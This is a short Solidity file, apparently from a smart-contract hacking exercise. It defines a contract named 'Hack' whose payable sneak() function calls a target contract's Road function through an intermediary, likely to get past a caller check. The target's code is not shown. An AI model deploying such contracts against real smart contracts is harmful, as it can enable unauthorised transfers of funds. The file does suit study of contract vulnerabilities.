import "browser/Supreme.sol";
contract Hack {
    Supreme public sup;

    function Hack(Supreme _sup) public {
        sup = _sup;
    }

    function sneak() public payable {
        sup.Road.value(msg.value)();
    }
}
